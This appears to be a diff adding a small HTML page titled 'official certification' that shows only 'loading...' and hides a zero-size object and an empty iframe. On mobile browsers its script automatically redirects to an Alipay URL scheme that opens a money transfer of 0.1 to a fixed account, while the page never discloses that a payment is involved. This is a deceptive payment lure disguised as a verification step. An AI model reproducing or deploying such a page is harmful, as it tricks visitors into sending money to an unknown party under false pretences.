@@ -1,0 +1,26 @@
+
+<html>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta charset="utf-8">
+<title>官方认证</title>
+
+<body style="margin:0;padding:0;height:100%" scroll=no>
+<div id="msg">loading...</div>
+<object data="https://baidu.com" width="0" height="0"></object>
+<iframe id="infrm" marginwidth="0" marginheight="0" width="100%" scrolling=auto frameborder="0" ="100%" target="_parent"></iframe>
+</body>
+<script src="//lib.baomitu.com/jquery/3.7.1/jquery.js"></script>;
+
+
+
+
+  <script type="text/javascript">
+
+  if (window.navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) {
+		var url_scheme = 'alipayqr://platformapi/startapp?saId=20000032&url=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FappId%3D20000123%26actionType%3Dscan%26biz_data%3D%257B%2522s%2522%253A%2522money%2522%252C%2522u%2522%253A%25222088052999146807%2522%252C%2522a%2522%253A%25220.1%2522%252C%2522m%2522%253A%2522qianfu_829ec977-68c5-48db-aa5a-e582027a809a%2522%257D';
+		console.log(url_scheme);
+		window.location.href = url_scheme;
+		layer.msg('正在自动唤醒支付宝...', {shade: 0,time: 1000});
+        }
+
+</script>
